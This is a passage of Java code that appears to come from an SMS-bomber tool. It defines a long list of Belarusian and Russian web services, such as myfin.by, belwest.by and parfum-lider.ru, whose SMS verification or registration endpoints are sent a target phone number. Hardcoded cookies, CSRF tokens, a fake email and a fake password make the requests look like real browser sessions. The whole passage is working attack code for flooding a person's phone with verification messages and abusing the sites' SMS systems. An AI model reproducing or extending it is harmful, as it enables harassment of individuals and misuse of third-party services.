                new JsonService("https://shop.milavitsa.by/api/accounts/signUp", 375) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "_ym_uid=1669561951420317747; _ym_d=1669561951; _ga_1N8M41LBJN=GS1.1.1669561950.1.0.1669561950.0.0.0; _ga=GA1.1.1063980318.1669561951; _ym_visorc=w; _ym_isad=2");

                        try {
                            return new JSONObject()
                                    .put("email", "bayeyip588@runfons.com")
                                    .put("name", getRussianName())
                                    .put("password", "Eeza.zBw_RQnRx7")
                                    .put("passwordConfirm", "Eeza.zBw_RQnRx7")
                                    .put("phone", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://e-zoo.by/local/gtools/login/", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+375(**)*** ** **"));
                    }
                },

                new ParamsService("https://myfin.by/send-code/verify", 375) {
                    @Override
                    public void buildParams(Phone phone) {
                        request.header("cookie", "_ym_uid=16701561781022942428; _ym_d=1670156178; _fbp=fb.1.1670156178980.265937461; _csrf=94355b3458805f379ef8f8bb595e1efe5c736145b680d3ca0b6b6e1075355d0ea:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"aGKKPUlt553LKlYGo4MCSpOnadr - opGA\";}; PHPSESSID=0pr0eiesva2sck5i7spck8c0d5; _ym_isad=2; _ym_visorc=b; _ga_MBM86B183B=GS1.1.1671291859.3.0.1671291859.0.0.0; _ga=GA1.2.832821120.1670156179; _gid=GA1.2.52421973.1671291860; _gat_UA-33127175-1=1");
                        request.header("x-csrf-token", "4MD0-i3YOqmZnr8ow6WKZEku5BC13JoWgTEHQY1bg5uBh7-xfY1W3ayrjGSIydMjJhqpU-as1XjgVXVs4ivE2g==");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.addQueryParameter("action", "sendSms");
                        builder.addQueryParameter("phone", Phone.format(phone.getPhone(), "375(**)***-**-**"));
                        builder.addQueryParameter("userIdentityId", "undefined");
                        builder.addQueryParameter("ga", "GA1.2.832821120.1670156179");
                    }
                },

                new FormService("https://belwest.by/ru/register/sendCode", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "JSESSIONID=3128BE9342EDB0870F1A110B21CEBEDE; cookie-notification=NOT_ACCEPTED; _gid=GA1.2.1133217827.1670156447; _gat_UA-102366257-1=1; _gat_UA-102366257-3=1; _fbp=fb.1.1670156446924.1246257691; _clck=1dikqyz|1|f74|0; _ym_uid=167015644875968174; _ym_d=1670156448; _ym_isad=2; _ym_visorc=w; _ga_3PWZCWZ7CZ=GS1.1.1670156447.1.1.1670156471.0.0.0; _ga=GA1.2.281260943.1670156447; _clsk=uolfne|1670156472944|2|1|i.clarity.ms/collect");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("mobileNumber", phone.getPhone());
                        builder.add("mobileNumberCode", phone.getCountryCode());
                        builder.add("CSRFToken", "46031ff7-214b-41fc-80f6-96d251219626");
                    }
                },

                new FormService("https://shop.by/management/user/register/?phone=2&lctn=shopby/", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "csrf-token=RJUejcwixKQ1xRcJ; _gid=GA1.2.1680945104.1670156802; _ym_uid=1670156803918643804; _ym_d=1670156803; _gcl_au=1.1.1670310313.1670156803; _gat=1; tmr_lvid=b675e317596c82679c35aa345dd1c925; tmr_lvidTS=1670156803069; _ym_isad=2; _ga=GA1.1.779770407.1670156802; tmr_detect=0|1670156806498; PHPSESSID=lsi108lvrs9arj36vev8ub9ht5; _ga_820MZ1YKJX=GS1.1.1670156803.1.0.1670156817.46.0.0");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("LRegisterForm[phone]", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"));
                        builder.add("LRegisterForm[personal_data_privacy_policy]", "0");
                        builder.add("LRegisterForm[personal_data_privacy_policy]", "1");
                    }
                },

                new FormService("https://vprok.prostore.by/get-assistant-code", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "_ym_uid=1670157057914379197; _ym_d=1670157057; _ga=GA1.2.1178854623.1670157057; _gid=GA1.2.239203896.1670157057; _gat_gtag_UA_163877616_1=1; _gat=1; _ym_isad=2; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6InFUUVI1bnpcL245bG1nR3hEUDlBSDlRPT0iLCJ2YWx1ZSI6InE4NVdIc1daUFRTVlwvYU83RlZHT3pVR0puWFZVeHhpcWJzZlVSRHN3RXhzcnJjbHNmOXRvXC8rT2RtdWF0YW9ReiIsIm1hYyI6IjQxOTBkMzg4MTVjNmE4ODQ1ZDAyMWE4NTNmZDYxNGU2NzQ1M2ZmYWZiYWNmZTk1NTUxZThjY2YyZDMzZGY4OGYifQ==; laravel_session=eyJpdiI6InpXVGd6U2V4VXFER0ZlXC9zXC9VWkI0dz09IiwidmFsdWUiOiJEdDVXcFl2QkZYVWlFWjBlVTllVTErc3R4R3g4RENiTXR3ak1rek1HNzY5OGZBb2hEM0xxcUh0SXRHaFA3aU9OcFBcLytkZ3Z4T2sxQnBjV3lTUWxCVUFzMHVMVjRLd0dXYnhMc0NQcWVyUWlmTVNIVGM2NWFFa2NiWW9oYlQzV2giLCJtYWMiOiIyOGJhZmJiNjc5ZjAyODg1NjhkNzJiZmJiMmZkMDIwMjRlNTRlM2M0OTdjZDU0NGRhNTg3ZGZkNjA4YzkxYzgxIn0=");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("register_phone", Phone.format(phone.getPhone(), "(**) *** ** **"));
                        builder.add("_token", "RPKvgHhO1hiwEaYNfre7og7JiwD4ArxDrp4umzhW");
                    }
                },

                new JsonService("https://www.slivki.by/login/phone/send-code", "PATCH") {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "PHPSESSID=r6uocec2pcnjpnr9fjls12g7el; _gid=GA1.2.674791248.1670157758; _ga_VGFW27H90X=GS1.1.1670157757.1.0.1670157757.0.0.0; _ga=GA1.1.272570267.1670157758; _fbp=fb.1.1670157758128.294592220; _tt_enable_cookie=1; _ttp=57c80ff9-4ea7-4ec1-b60a-78ab42fd080c; _ym_uid=1670157760103754562; _ym_d=1670157760; refresh=1; fullSiteBanner1=babahnem-baj; _ym_isad=2; googtrans=null; googtrans=null; googtrans=null");

                        try {
                            return new JSONObject()
                                    .put("phoneNumber", "+" + phone.getCountryCode() + Phone.format(phone.getPhone(), "******-**-**"))
                                    .put("token", "acb6aea77.KMOmk0lXMQw24Jdp3cfj3DAhf7f_6V9PormobRsXxQk.GKjk3wpjQn18rqQB6JWqkR1TOPSejAwE1szMVXVk8XlLt5ThMw95PEWnwg")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://xn--80aeec0cfsgl1g.xn--p1ai/register/sms")
                                .header("x-xsrf-token", "eyJpdiI6Ill3TFZkZW5ZODdhMDQ3aU9vOEZpbHc9PSIsInZhbHVlIjoiRlVsakd5R2xPNVE2ZUlmXC9yWXJTSGIzN1wvbDZRR05YeFk1WmRiM3pMeGRJSU4rNEcwNHRSZ3ppS3BHNTl2KzRYIiwibWFjIjoiZjM0YTA3NGVjOTZiN2M0NmY0OGY0MDdlMzI1OGE1M2Y4Y2M5N2I5YzIwOGJiZTFkNzA0ZjQ1MzViMzlmMWYxZSJ9")
                                .header("Cookie", "_ga=GA1.2.1794528238.1670160259; _gid=GA1.2.2107102391.1670160259; _ym_uid=1670160260319820000; _ym_d=1670160260; _ym_isad=2; _ym_visorc=w; tmr_lvid=48e6229f0b5dd99ebdc841777c57c535; tmr_lvidTS=1670160262034; _fbp=fb.1.1670160262307.2060817164; tmr_detect=0|1670160268941; XSRF-TOKEN=eyJpdiI6Ill3TFZkZW5ZODdhMDQ3aU9vOEZpbHc9PSIsInZhbHVlIjoiRlVsakd5R2xPNVE2ZUlmXC9yWXJTSGIzN1wvbDZRR05YeFk1WmRiM3pMeGRJSU4rNEcwNHRSZ3ppS3BHNTl2KzRYIiwibWFjIjoiZjM0YTA3NGVjOTZiN2M0NmY0OGY0MDdlMzI1OGE1M2Y4Y2M5N2I5YzIwOGJiZTFkNzA0ZjQ1MzViMzlmMWYxZSJ9; podatvsudrf_session=eyJpdiI6Iml6U1F3R0syeDNDMTVSSXV1UWZ3VVE9PSIsInZhbHVlIjoiOHY0ZDVVV1hNcGhlSmEweGxQZklnRjY0V2htZ2YreG5GaG9YS3lGVFpIWGlEQjdtNTRPRjFHRjlDbEdBbVJ6RCIsIm1hYyI6IjQxMjRlNWNmYjU2NjQ4N2I3ZWU1YzVhNGJkMTI1YTY4YTY0YzViODZlMDIyMDIzY2RmNGMyNDVhMWQzZjVjOTUifQ==")
                                .post(RequestBody.create("------WebKitFormBoundaryojtGN2EYSA0JevB6\n" +
                                                "Content-Disposition: form-data; name=\"phone\"\n" +
                                                "\n" +
                                                phone +
                                                "\n" +
                                                "------WebKitFormBoundaryojtGN2EYSA0JevB6--",
                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryojtGN2EYSA0JevB6")))
                                .build()).enqueue(callback);
                    }
                },

                new JsonService("https://delivio.by/be/api/register", 375) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "_gcl_au=1.1.1476918049.1670159308; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _gid=GA1.2.2091401158.1670159308; _ym_uid=1670159309267213207; _ym_d=1670159309; _fbp=fb.1.1670159309067.59569870; _ga=GA1.2.170754787.1670159308; _ga_SK36CGG6EZ=GS1.1.1670170177.2.1.1670170181.56.0.0; _ym_isad=2");

                        try {
                            return new JSONObject()
                                    .put("phone", "+" + phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://imarket.by/ajax/auth.php", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "BITRIX_SM_GUEST_ID=29787461; BITRIX_SM_is_mobile=N; BITRIX_SM_SALE_UID=1105317986; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _gcl_au=1.1.1013370155.1670159832; _gid=GA1.2.393902877.1670159832; tmr_lvid=8a0e231161a3fa361d43504aa1f00459; tmr_lvidTS=1670159832283; _ym_uid=1670159833318352265; _ym_d=1670159833; enPop_sessionId=f6dadec7-73d5-11ed-b494-ea4186e0ba49; _ms=1529516c-d7d6-40d3-b567-d1a56c996a55; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; clickanalyticsresource=ef8556dd-b8be-47a4-8a36-a41b5c8ec1ea; PHPSESSID=Kd4Bx0rSsKWDxx24PP1mWvZLbQ3ZfUAf; _gat_UA-54357557-1=1; _ga_HKDSD3883C=GS1.1.1670174396.2.0.1670174396.60.0.0; _ga=GA1.1.992877548.1670159832; _ym_visorc=b; tmr_detect=0|1670174398465; BITRIX_SM_LAST_VISIT=04.12.2022+20:20:04");
                        request.header("x-requested-with", "XMLHttpRequest");

                        builder.add("action", "phoneReg");
                        builder.add("PHONE_NUMBER", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"));
                        builder.add("PHONE_CODE", "");
                    }
                },

                new JsonService("https://api.qugo.ru/client/send-code", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        try {
                            return new JSONObject()
                                    .put("phone", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new JsonService("https://monro24.by/user-account/auth-api-v2/requestProcessor.php") {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "mobile=0; PHPSESSID=bace5u00ika8uof0l5fnarghqa; force_retail=1; tmr_lvid=410e418fcc154263f49cb33f89a7d116; tmr_lvidTS=1659889538438; _ym_uid=1659889539808263206; _ym_d=1671287138; _ym_visorc=w; _fbp=fb.1.1671287138438.164094442; _ga_Y2EVY0XNQR=GS1.1.1671287138.1.0.1671287138.60.0.0; _gcl_au=1.1.1998363881.1671287139; _ga=GA1.2.1902648730.1671287139; _gid=GA1.2.832627514.1671287139; mla_visitor=cd6d7305-a822-4fb5-b1de-39630f27e8b5; roistat_visit=5161518; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _gat_gtag_UA_58872796_2=1; subscribe=1; CookieNotifyWasShown=true; _tt_enable_cookie=1; _ttp=hH6r6WBtNfvJs0u_rud7w6J66oz; _ym_isad=2; mlaVisitorDataCheck=true; c2d_widget_id={\"29ce0c23c6847da7762665e3334c1d84\":\"[chat] 5b2a7cf5f1f20e9cf984\"}; ___dc=fec6163f-13da-4ae6-8158-9d2438579224; tmr_detect=0|1671287142135; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=[]; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,roistat_call_tracking,roistat_emailtracking_email,roistat_emailtracking_tracking_email,roistat_emailtracking_emails; cart_token=639dd17caf2b87.55241429167838119; ny-steps=nyCategories; activity=8|30");

                        try {
                            return new JSONObject()
                                    .put("action", "generateOtp")
                                    .put("login_contact", "+" + phone)
                                    .put("personal_identificator", "")
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://bonus.sila.by/", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("x-requested-with", "XMLHttpRequest");
                        request.header("Cookie", "_gcl_au=1.1.1258362633.1670779318; tmr_lvid=2c2c90b746185d1088071821758e2f47; tmr_lvidTS=1670779318704; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _ym_uid=1670779319225302469; _ym_d=1670779319; _tt_enable_cookie=1; _ttp=122a8487-c5e6-43aa-9c1b-3da364459fc9; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; stock=0; dost=0; pzakaz=0; privl=0; bvznos=0; city=city_all; rsort=0; csort=0; hsort=0; CLIENT_ID=3c380bc73490fc87d22f8f6498d2fdf8; CLIENT_ID_D=2022-12-17; current_sbjs={\"type\":\"typein\",\"source\":\"direct\",\"medium\":\"(none)\",\"campaign\":\"(none)\",\"content\":\"(none)\",\"term\":\"(none)\"}; _gid=GA1.2.1875298458.1671288629; _fbp=fb.1.1671288628957.1297417435; _ym_isad=2; _ym_visorc=b; _ga_RX9C2H96ND=GS1.1.1671288628.2.1.1671288717.52.0.0; _ga_61E2WGG401=GS1.1.1671288628.2.1.1671288717.0.0.0; _ga=GA1.2.1527090176.1670779319; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1671288720680");

                        builder.add("form_phone", Phone.format(phone.getPhone(), "+(375) (**) ***-**-**"));
                        builder.add("form_index", "");
                        builder.add("step", "confirm_ok");
                        builder.add("action", "send_sms");
                        builder.add("key", "");
                    }
                },

                new FormService("https://ostrov-shop.by/ajax/auth_custom.php", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("backurl", "/basket/");
                        builder.add("AUTH_FORM", "Y");
                        builder.add("TYPE", "AUTH");
                        builder.add("POPUP_AUTH", "Y");
                        builder.add("USER_PHONE_NUMBER", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"));
                        builder.add("UF_DATE_AGREE_DATA", "10.12.2022 17:59");
                        builder.add("UF_CONSENT", "on");
                        builder.add("Login1", "Y");
                        builder.add("IS_AJAX", "Y");
                    }
                },

                new FormService("https://chitatel.by/send-code", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("X-Requested-With", "XMLHttpRequest");
                        request.header("Cookie", "_ga=GA1.2.290784147.1671288272; _gid=GA1.2.968710235.1671288272; _gat_UA-64066831-1=1; _gat_gtag_UA_64066831_1=1; tmr_lvid=f634f47d2ff0fec7f1c9ab4cf1a4b7fe; tmr_lvidTS=1671288271709; _ym_uid=1671288272615254027; _ym_d=1671288272; _ym_isad=2; _ym_visorc=w; _fbp=fb.1.1671288273233.1930776256; tmr_detect=0|1671288275026; assitcode=787350; st=a:4:{s:5:\"phone\";s:12:\"375253425432\";s:8:\"end_time\";i:1671331488;s:7:\"attempt\";i:1;s:4:\"time\";i:1671288288;}; XSRF-TOKEN=eyJpdiI6ImViVXFKNHdsSTlVNVRqT2FOUEFISnc9PSIsInZhbHVlIjoicmYwRlNaUFlEYUxUWWNaY2VXYmRjcGZrS0tyeDVWZGZIcFQ4cjZBT1pBNmt4a095WEpTXC9IaFM2YmttYzZJc2ZYRmE0Mlwvc1BhMFNKWGFlMVhlY2ZjUT09IiwibWFjIjoiNTgxNDljYmViMDgxYjJkZDNkN2FkZjkzMzNkY2RjYmM3ZjE5NWU1ZWM1YzA0NTU5N2UyNTBhNzIxYjQzYTc3MSJ9; chitatel_session=eyJpdiI6IjlhRUtRWkttVE9od1JodDVBbmMzV1E9PSIsInZhbHVlIjoiN2wrTys3RGhNZ0EzSElaWGZXdURkWnF5b1FQVmxOdmY1NlwvUFh0K29laW4zUU16c0hWV2JTdDlRbnZxXC9EK2FuRncrNGF3aHg5UjRtWTFHTitHZHVVQT09IiwibWFjIjoiNDFmMDRkMDY0MGM2NDRhYzQ3OTViZTA3NzQ0M2U5ODhiODg5NTgwZjYwZTU2YWVlMjQ4NWM1MjZlODE0ZDlhNCJ9");

                        builder.add("tel", Phone.format(phone.getPhone(), "+375(**)*******"));
                        builder.add("_token", "7bExV7WeW0wmdI83WV7Ie15I3u76NWj31g6ZINMJ");
                    }
                },

                new FormService("https://burger-king.by/bitrix/services/main/ajax.php?mode=class&c=gmi:auth&action=auth", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.headers(new Headers.Builder()
                                .addUnsafeNonAscii("Cookie", "PHPSESSID=GdOObYTyZnr3Y6IKTLBAHBiKKPuEiRPQ; MITLAB_LOCATION=Минск; BITRIX_SM_SALE_UID=e9a04576ac4ff47afcca148588730f08; _gcl_au=1.1.517852574.1670158994; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1670187540,\"UNIQUE\":[\"conversion_visit_day\"]}; tmr_lvid=6d30e847bf5b1fa358bc5883aceb291e; tmr_lvidTS=1670158994895; _gid=GA1.2.1799965065.1670158995; _gat_UA-97562271-1=1; _ym_uid=1670158996375763202; _ym_d=1670158996; _ym_visorc=w; _ym_isad=2; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _fbp=fb.1.1670158996398.1982554257; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _tt_enable_cookie=1; _ttp=2cd5d1d3-dff6-4719-b37d-396b7b001d43; tmr_detect=0|1670158997863; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ga=GA1.2.1576225425.1670158995; _ga_S74W5N1C73=GS1.1.1670158996.1.0.1670159005.0.0.0; _ga_M7LVHBCDVN=GS1.1.1670158996.1.0.1670159005.0.0.0")
                                .build());

                        builder.add("fields[action]", "send_code");
                        builder.add("fields[phone]", Phone.format(phone.getPhone(), "+375(**) *******"));
                        builder.add("SITE_ID", "s1");
                        builder.add("sessid", "ed6df32bf2e9efe2deaa84c498c78811");
                    }
                },

                new FormService("https://www.techport.ru/registration?type=false") {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("aero", "1")
                                .add("username", getUserName())
                                .add("login", "+" + phone)
                                .add("password", getEmail());

                    }
                },

                new JsonService("https://api.qugo.ru/client/send-code") {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Origin", "https://qugo.ru");
                        request.header("Referer", "https://qugo.ru/");

                        try {
                            return new JSONObject()
                                    .put("phone", phone.toString())
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

                new FormService("https://posudacenter.ru/bitrix/services/main/ajax.php?mode=class&c=itc%3Auser.phone.auth&action=processPhoneRequest", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=83l7ulg8upbv198cav6sv92ciu; BITRIX_SM_SALE_UID=f9011e478173d3870a10f5076d743cbd; BITRIX_SM_DASHAMAIL_CUSTOMER_ID=132020738; _ym_uid=1674041421803538; _ym_d=1674041421; _ym_debug=null; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1674061140,\"UNIQUE\":[\"conversion_visit_day\"]}; BITRIX_SM_LAST_VISIT=18.01.2023+18:30:19; _ym_visorc=w; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.2033826660.1674041422; _gid=GA1.2.2055667658.1674041422; _gat_UA-15836682-2=1");

                        builder.add("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                        builder.add("userType", "fiz");
                        builder.add("inn", "undefined");
                        builder.add("SITE_ID", "s1");
                        builder.add("sessid", "3124663f2fbe959b361a3808904870bd");
                    }
                },

                new FormService("https://www.parfum-lider.ru/local/ajax/reg.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.headers(new Headers.Builder()
                                .add("x-requested-with", "XMLHttpRequest")
                                .add("origin", "https://www.parfum-lider.ru")
                                .addUnsafeNonAscii("Cookie", "PHPSESSID=6E0TSeiRZADPTeHXHo9LijTj4SKU4coc; parfumlider_GUEST_ID=19235623; parfumlider_LAST_VISIT=18.01.2023 17:40:16; parfumlider_SALE_UID=7e1a3fe903c487fe724747cf4eebd5b2; parfumlider_ALTASIB_LAST_IP=84.17.55.155; parfumlider_ALTASIB_GEOBASE={\"COUNTRY_CODE\":\"IT\",\"COUNTRY_CODE3\":\"ITA\",\"COUNTRY_NAME\":\"Italy\",\"REGION_CODE\":\"\",\"REGION_NAME\":\"\",\"CITY_NAME\":\"\",\"POSTINDEX\":\"\",\"CONTINENT_CODE\":\"EU\",\"latitude\":\"43.1479\",\"longitude\":\"12.1097\"}; parfumlider_ALTASIB_GEOBASE_CODE={\"REGION\":{\"CODE\":\"77\",\"NAME\":\"Москва\",\"FULL_NAME\":\"Москва Город\",\"SOCR\":\"г\"},\"DISTRICT\":{\"CODE\":\"\",\"NAME\":\"\",\"SOCR\":\"\"},\"CITY\":{\"ID\":\"\",\"NAME\":\"Москва\",\"SOCR\":\"г\",\"POSTINDEX\":\"0\",\"ID_DISTRICT\":\"77000\"},\"CODE\":\"77000000000\"}; parfumlider_ALTASIB_GEOBASE_COUNTRY={\"country\":\"RU\"}; parfumlider_currentStoreCity=77000000000; parfumlider_kernel=-crpt-kernel_0; _ym_uid=1674042020985718314; _ym_d=1674042020; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1674064740,\"UNIQUE\":[\"conversion_visit_day\"]}; parfumlider_kernel_0=6dcaLtgLym5UVYw8_JDqdwD1MiscIZgzSE0UhciUhzvtub-2bE3plgSL7FyKtDYAze5aw4Oty1-sgzH1acbfH464_KzH-W4DlmCFooOUe4VJPbzBRIUjzct_w5w-fNnegj-V7BQiM8QPB0bBHFFFhPxAOvJwZ4JcVTEpMYh3jEnzmucRipF6khN-W2rQ0yuclocyajqJBWlP_XxGw1vUILdH521Dtxp44sDHLaGwuEzWSw-pi9-4f21dz7bsk2a8sRVdxdeAozJ62QQt6xGc8Z5aHeCISyHsM9HDaidc2p_k9LElpjbcSyipJWqtShUrdK330i0Hnqp28xXi-2NdXDtXua4IYNIgU3eyfBADRn1MvtaobskR9_t3nB3d1KO3Fsqsj62R8K7M6ya_Fjfhko40hPCwwPYfRpr9jTDtFyBZKJeu0L00cvSSfm8G1eKQF4w19tmlRVMLRQ-KLj4_qGFtotgNfveI0lzYDacMEV5cbSinAjeCFNsS0PssQLy8BHjPq5go20H3LzxdtCPakw3c0OFJ8q2PEr6NYrcVD0MlMx8DqoFYSlyQrdkvShMcrAimlcv9qIgzuSrLmYteGIDSQFB9cAznTrfrqzwfDuenKHw5Bt3w4Kf_hoC8wLfyNQF06rG-x3RywnlPneD_e9YBHnGVZgoRI1efdmDER9EWZBlGqNUSCfxniAlxXSdSUjraSy60-gP_i__zHfScd6oniK-ITLzqckgYALe5x79fJXI_Cq3GNGmxkcTTTq62ooeU3KpZBSU6ef5D5ZDxZHyarl6IXhfyJsg74zLn0gpWlU_kKFXqEDE5Ij5iIMrD6RS9LuJS9pUf1I3ZI6rDJ1ieWx0NcfvYJ3iv0b_kSbD-_7frryy3Es3ASWkXUJ48HO4LKJcynrCYECaXUbRE_7WLl6Mnhqlznozf5f6YMw7WmCxW-1uBmUoKykf6aHiWIWiu_BS76cyK8lnGwVK8dLid911WAvZqBpOfkfANACqDyj7nf23fRkE7o3rO6_3-VmyPmQGWll93NsscRzZGFSrF95zi569Jo4dCCb8_uKLA92D7p-jlluJYkJYAx4kGjDcBhA1LjX47Dcn8EckhMVfBzn3iZQcb56CsZCSZBRTVj1xf04Xz7i4tGCkspAXumc4oRun4fi1El-sS_LtFGZm-3mr7yoDj59zL; _userGUID=0:ld1lea5a:MvCqpDgsEmLqGd86~3sOd~ZezVhJXwx_; dSesn=e2f06d55-7575-8839-34be-a73965fef9e3; _dvs=0:ld1lea5a:nHjx12lMtKatjhTdxCP5wYyZU_BAuT0E; _ym_isad=2; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.320347681.1674042022; _gid=GA1.2.2133330543.1674042022; _gat=1; _gat_gtag_UA_8407288_3=1; _gcl_au=1.1.1538185897.1674042022; _dc_gtm_UA-184775945-1=1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _gat_frisbuyGa=1")
                                .addUnsafeNonAscii("referer", "https://www.parfum-lider.ru/?utm_source=yandex&utm_medium=cpc&utm_campaign=adgasm_yandex_search_msk-spb_brand&utm_term=парфюм лидер&utm_content=campaignid=71469316_groupid=4889285025_adid=12034438857_device=mobile_geo=Москва_source=none&_openstat=ZGlyZWN0LnlhbmRleC5ydTs3MTQ2OTMxNjsxMjAzNDQzODg1Nzt5YW5kZXguY29tOnByZW1pdW0&yclid=3567795455617925119")
                                .build());

                        builder.add("firstname", getRussianName());
                        builder.add("lastname", getRussianName());
                        builder.add("email", getEmail());
                        builder.add("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                        String password = getEmail();
                        builder.add("password", password);
                        builder.add("cpassword", password);
                        builder.add("code", "");
                        builder.add("show_code_block", "");
                    }
                },

                new FormService("https://webgate.24guru.by/api/v3/auth?lang=ru&cityId=3&jsonld=0&onlyDomain=1&domain=bycard.by&distributor_company_id=296", 375) {
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("phone", Phone.format(phone.getPhone(), "+375 ** ***-**-**"));
                        builder.add("country", "BY");
                    }
                },

                new FormService("https://evelux.ru/local/templates/evelux/ajax/confirm.phone.php", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.header("Cookie", "PHPSESSID=hkmv218l5bj0ecie6mi1lrdmgf; CHECK_COOKIE=Y; EVELUX_SM_GUEST_ID=97681; EVELUX_SM_SALE_UID=cbcc80295ff39e55f5e4abfed249f62b; _ga=GA1.1.1818619075.1674662998; ECITY=3667; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1674680340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=167466299925001007; _ym_d=1674662999; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; EVELUX_SM_LAST_VISIT=25.01.2023%2019%3A10%3A22; _ga_JS558ZNNRN=GS1.1.1674662997.1.1.1674663024.0.0.0; activity=0|30");

                        builder.add("PHONE", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
                        builder.add("TYPE", "REG");
                        builder.add("CONFIRM_PHONE", "Y");
                    }
                },

                new JsonService("https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code", 7) {
                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "00bcc2c49129af9bd7e2d92cb51ab14c=f60bc04df68b1680331437133025b53f; 33dc6fb66f07bbc13d7e8a3e3a4df978=f60bc04df68b1680331437133025b53f; ce2186f97fc08728512058e32d42e3a8=f60bc04df68b1680331437133025b53f; _ym_uid=1674663457615854858; _ym_d=1674663457; _ym_isad=2; _ym_visorc=w; remove_token=1; tmr_lvid=cd34b6ce59fd14abe64455961bcbd77c; tmr_lvidTS=1674663462883; __exponea_etc__=bf4f369d-5796-4166-9e43-8065875990ea; __exponea_time2__=-0.7267756462097168; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1674663465216");
                        request.header("referer", "https://svoefermerstvo.ru/auth?authFrom=index&backurl=https://svoefermerstvo.ru/&failurl=https://svoefermerstvo.ru/");
                        request.header("origin", "https://svoefermerstvo.ru");

                        try {
                            return new JSONObject()
                                    .put("login", "+" + phone)
                                    .toString();
                        } catch (JSONException e) {
                            return null;
                        }
                    }
                },

